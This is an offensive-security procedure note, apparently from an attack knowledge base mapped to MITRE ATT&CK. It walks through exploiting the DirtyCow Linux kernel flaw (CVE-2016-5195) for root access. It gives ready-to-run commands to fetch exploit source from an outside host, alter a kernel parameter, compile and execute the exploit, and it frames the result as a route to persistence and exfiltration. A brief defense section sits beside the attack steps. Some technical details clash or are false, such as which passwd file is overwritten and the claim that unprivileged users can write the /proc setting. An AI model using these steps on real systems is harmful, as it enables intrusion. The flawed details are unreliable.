---
id: 71e9ba02-9f5b-4a60-b0f1-e373d52a288e
name: dirtycow-linux-privilege-escalation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:19.664402+00:00'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
sub_techniques: []
tags:
  - '[[tags/CVE-2016-5195 (DirtyCow)]]'
  - '[[tags/Kernel Exploits]]'
  - '[[tags/Linux - Privilege Escalation]]'
commands:
  - '[[commands/download-dirtycow-exploit-code]]'
  - '[[commands/set-dirty-writeback-centisecs-zero]]'
  - '[[commands/compile-dirtycow-exploit]]'
  - '[[commands/run-dirtycow-exploit]]'
platforms:
  - Linux
tools: []
validated: true
---

# dirtycow-linux-privilege-escalation

## Summary

This procedure exploits the DirtyCow vulnerability (CVE-2016-5195) in the Linux kernel to achieve local privilege escalation from a low-privileged user to root. It leverages a race condition in the kernel's copy-on-write mechanism to gain write access to read-only memory mappings, allowing modification of system files like /etc/passwd to create a root shell.

## Description

DirtyCow is a well-known Linux kernel vulnerability affecting versions prior to 4.8.3, 4.7.9, and others, discovered in 2016. The exploit targets the madvise()/mprotect() system calls combined with copy-on-write breakpoints, enabling an unprivileged user to overwrite read-only files. In an offensive security context, this is used post-initial access to escalate privileges on a compromised Linux host, enabling persistence, data exfiltration, or lateral movement. The procedure assumes a vulnerable kernel (check with `uname -r`) and requires compilation capabilities. Success grants a root shell, but the system may become unstable due to kernel manipulation.

## Requirements

1. Low-privileged shell access on a vulnerable Linux system (kernel < 4.8.3 or unpatched).
2. Internet access to download the exploit PoC (or transfer via other means).
3. GCC/G++ compiler installed (standard on most distros; e.g., `apt install build-essential` on Debian-based).
4. Target architecture: x86_64 (common; adjust for others if needed).

## Defense

- Apply kernel patches for CVE-2016-5195 (update to kernel 4.8.3+ or backport fixes).
- Monitor for unusual process behavior, such as high CPU from repeated madvise calls or modifications to /proc/sys/vm/dirty_writeback_centisecs.
- Enable kernel auditing (auditd) to log privilege escalations and file changes to sensitive paths like /etc/passwd.
- Use containerization or SELinux/AppArmor to restrict low-priv users from accessing kernel interfaces.

## Objectives

1. Download and prepare the DirtyCow exploit PoC code.
2. Modify kernel parameters to stabilize the exploit.
3. Compile and execute the exploit to overwrite a system file and gain root access.
4. Verify escalation by spawning a root shell.

## Instructions

### Step 1: Download the Exploit PoC

**Context**: Obtain the DirtyCow proof-of-concept code (40847.cpp) from the official repository to prepare for compilation. This step ensures you have the necessary source file on the target system.

**Command** ([[commands/download-dirtycow-exploit-code]]):
```bash
curl -O https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/poC/40847.cpp
```

> This downloads the C++ source file for the exploit. Expected output is a success message like "100%" or no error, and the file 40847.cpp appears in the current directory (verify with `ls -l 40847.cpp`). If curl is unavailable, use wget: `wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/poC/40847.cpp`.

### Step 2: Stabilize Kernel for Exploit

**Context**: Set the kernel's dirty_writeback_centisecs parameter to 0 to prevent page flushing interference, making the race condition more reliable for the exploit to succeed.

**Command** ([[commands/set-dirty-writeback-centisecs-zero]]):
```bash
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
```

> This temporarily disables delayed writeback. Expected output is no response (silent success). Verify with `cat /proc/sys/vm/dirty_writeback_centisecs` showing "0". Note: This requires write access to /proc, available to low-priv users, but changes revert on reboot.

### Step 3: Compile the Exploit

**Context**: Compile the downloaded PoC into an executable binary using g++, including necessary flags for threading and optimization to ensure the exploit runs correctly.

**Command** ([[commands/compile-dirtycow-exploit]]):
```bash
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
```

> This builds the dcow executable. Expected output is compilation messages ending with no errors (e.g., "g++: done"). Verify with `ls -l dcow` showing the binary file. If errors occur, ensure g++ is installed and the source file is intact.

### Step 4: Execute the Exploit

**Context**: Run the compiled exploit to trigger the DirtyCow vulnerability, which overwrites /usr/bin/passwd to grant root privileges, allowing a root shell upon re-execution of passwd.

**Command** ([[commands/run-dirtycow-exploit]]):
```bash
./dcow
```

> This launches the exploit, which may take a few seconds and show progress like "mmap RwY page" or race attempts. Expected output includes success messages (e.g., "pwn!" or no fatal errors like "mmap failed"). If successful, run `passwd` to get a root shell (it will execute the overwritten code). Verify escalation with `id` showing uid=0(root).
